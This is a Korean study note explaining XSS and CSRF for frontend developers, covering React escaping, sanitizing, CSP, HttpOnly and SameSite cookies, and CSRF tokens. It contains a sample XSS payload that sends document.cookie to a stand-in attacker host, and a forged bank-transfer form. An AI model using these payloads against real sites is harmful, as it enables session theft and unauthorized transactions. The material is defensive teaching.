# XSS와 CSRF 기초

## 왜 프론트엔드가 알아야 하는가

프론트엔드는 사용자 입력을 화면에 렌더링하고, 브라우저 저장소를 다루며, 인증 요청을 보낸다. 그래서 XSS와 CSRF는 백엔드만의 문제가 아니라 프론트엔드 구현 방식과 직접 연결된다.

핵심 구분:

| 공격 | 핵심 아이디어 |
| --- | --- |
| XSS | 공격자가 웹 페이지에서 악성 JavaScript를 실행시킨다 |
| CSRF | 로그인된 사용자의 인증 상태를 이용해 원치 않는 요청을 보내게 한다 |

## XSS

XSS는 Cross-Site Scripting의 약자다. 공격자가 서비스 화면 안에서 악성 JavaScript를 실행시키는 공격이다.

예를 들어 댓글, 닉네임, 게시글 제목 같은 사용자 입력이 HTML로 그대로 삽입되면 문제가 될 수 있다.

위험한 예:

```tsx
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

만약 `html` 값에 악성 스크립트가 들어오면 브라우저에서 실행될 위험이 있다.

```html
<img src="x" onerror="fetch('https://attacker.example/cookie?' + document.cookie)">
```

XSS로 가능한 피해:

- 사용자의 세션 Cookie나 토큰 탈취
- 사용자 대신 API 요청 실행
- 화면 변조
- 피싱 UI 삽입
- 사용자 입력값 가로채기

## React와 XSS

React는 기본적으로 문자열을 HTML이 아니라 텍스트로 escape한다.

```tsx
function Profile({ name }: { name: string }) {
  return <p>{name}</p>;
}
```

`name`에 `<script>alert(1)</script>`가 들어와도 React는 이를 HTML로 실행하지 않고 텍스트로 보여준다.

하지만 다음 상황에서는 주의해야 한다.

- `dangerouslySetInnerHTML` 사용
- 외부 Markdown 또는 HTML 렌더링
- DOM API로 `innerHTML` 직접 사용
- 신뢰할 수 없는 URL을 링크, 이미지, iframe 등에 삽입
- 서드파티 스크립트 삽입

## XSS 대응

기본 원칙:

- 사용자 입력을 HTML로 직접 삽입하지 않는다.
- 꼭 HTML을 렌더링해야 한다면 sanitize를 적용한다.
- React의 기본 escaping을 우회하는 코드를 최소화한다.
- 인증 정보는 가능한 `HttpOnly` Cookie로 관리해 JavaScript 탈취 위험을 줄인다.
- Content Security Policy를 통해 실행 가능한 스크립트 범위를 제한한다.

`HttpOnly`의 역할:

- JavaScript에서 Cookie를 읽지 못하게 한다.
- XSS 자체를 막지는 않는다.
- XSS가 발생해도 세션 Cookie 탈취 위험을 줄인다.

중요한 한계:

- `HttpOnly` Cookie를 쓰더라도 XSS가 있으면 공격자가 사용자의 브라우저에서 API 요청을 보낼 수 있다.
- 따라서 XSS는 입력 처리, 출력 escaping, sanitize, CSP 등으로 함께 줄여야 한다.

## CSRF

CSRF는 Cross-Site Request Forgery의 약자다. 사용자가 서비스에 로그인된 상태를 이용해 공격자가 의도하지 않은 요청을 보내게 만드는 공격이다.

예를 들어 사용자가 `bank.example`에 로그인되어 있고 인증 Cookie가 브라우저에 저장되어 있다고 가정한다. 공격자는 다른 사이트에서 다음과 같은 요청을 유도할 수 있다.

```html
<form action="https://bank.example/api/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="100000" />
</form>
```

브라우저가 `bank.example` 요청에 Cookie를 자동으로 붙여 보내면, 서버가 추가 검증 없이 요청을 처리할 위험이 있다.

CSRF의 핵심:

- 공격자가 사용자의 Cookie 값을 직접 알아야 하는 것은 아니다.
- 브라우저가 대상 사이트 Cookie를 자동으로 전송하는 특성을 이용한다.
- 주로 Cookie 기반 인증에서 중요하다.
- 상태 변경 요청에서 특히 위험하다.

## CSRF 대응

기본 대응:

- `SameSite` Cookie를 설정한다.
- 상태 변경 요청에는 CSRF Token을 검증한다.
- 서버에서 `Origin` 또는 `Referer` Header를 검증한다.
- `GET` 요청으로 생성, 수정, 삭제를 하지 않는다.
- 중요한 작업은 재인증이나 추가 확인 절차를 둔다.

`SameSite`의 역할:

| 값 | CSRF 관점 |
| --- | --- |
| `Strict` | Cross-Site 요청에 Cookie를 거의 보내지 않아 강하게 제한 |
| `Lax` | 일부 탐색 요청은 허용하지만 일반적인 위험 요청을 줄임 |
| `None` | Cross-Site 요청에도 Cookie 전송. 별도 CSRF 대응 필요 |

CSRF Token 방식:

```text
1. 서버가 페이지나 API 응답으로 CSRF Token 발급
2. 프론트엔드가 상태 변경 요청 Header나 Body에 Token 포함
3. 서버가 Cookie 인증 정보와 CSRF Token을 함께 검증
```

공격자는 사용자의 Cookie가 자동 전송되게 만들 수는 있어도, 정상 페이지에서 발급된 CSRF Token을 알기 어렵게 만드는 것이 핵심이다.

## XSS와 CSRF 비교

| 구분 | XSS | CSRF |
| --- | --- | --- |
| 공격 방식 | 악성 JavaScript 실행 | 로그인된 사용자의 요청 위조 |
| 주요 원인 | 신뢰할 수 없는 입력을 실행 가능한 형태로 렌더링 | Cookie 자동 전송과 상태 변경 요청 검증 부족 |
| 주요 피해 | 토큰 탈취, 화면 변조, 사용자 대신 요청 | 사용자 의도와 다른 생성, 수정, 삭제 요청 |
| 주요 대응 | escaping, sanitize, CSP, HttpOnly | SameSite, CSRF Token, Origin 검증 |

## 토큰 저장 위치와 보안

프론트엔드 인증에서 토큰을 어디에 저장할지 자주 논의된다.

| 저장 위치 | 장점 | 위험 |
| --- | --- | --- |
| `localStorage` | 사용하기 쉽고 Header에 직접 넣기 편함 | XSS 발생 시 JavaScript로 탈취 가능 |
| 일반 Cookie | 자동 전송 가능 | JavaScript 접근 가능하면 탈취 위험 |
| `HttpOnly` Cookie | JavaScript 탈취 위험 감소 | CSRF 대응 필요 |
| 메모리 | 새로고침 시 사라져 탈취면이 작음 | UX와 재인증 처리 복잡 |

정답은 하나가 아니다. 서비스 구조, 위협 모델, 백엔드 인증 방식, 배포 도메인 구성에 따라 달라진다. 다만 면접에서는 저장 위치별 공격면과 대응책을 함께 설명해야 한다.

## 프로젝트 연결 점검

다음 코드를 찾으면 보안 관점에서 설명하고 개선할 수 있어야 한다.

- 사용자 입력을 `innerHTML` 또는 `dangerouslySetInnerHTML`로 렌더링하는 코드
- 외부 Markdown이나 HTML을 sanitize 없이 렌더링하는 코드
- 인증 토큰을 `localStorage`에 저장하는 코드
- Cookie 기반 인증인데 `SameSite` 정책이 불명확한 코드
- 상태 변경을 `GET` 요청으로 처리하는 API
- 삭제, 결제, 권한 변경 요청에 CSRF Token이나 Origin 검증이 없는 코드
- 외부 링크에 `rel="noopener noreferrer"` 없이 `target="_blank"`를 사용하는 코드

## 면접 답변 핵심

XSS는 공격자가 웹 페이지에서 악성 JavaScript를 실행시키는 공격이고, CSRF는 로그인된 사용자의 인증 상태를 이용해 원치 않는 요청을 보내게 하는 공격이다. XSS는 escaping, sanitize, CSP, HttpOnly Cookie로 위험을 줄이고, CSRF는 SameSite Cookie, CSRF Token, Origin 검증, 안전한 Method 설계로 방어한다. `HttpOnly`는 XSS 자체를 막는 것이 아니라 JavaScript로 Cookie가 탈취되는 위험을 줄이는 속성이다.
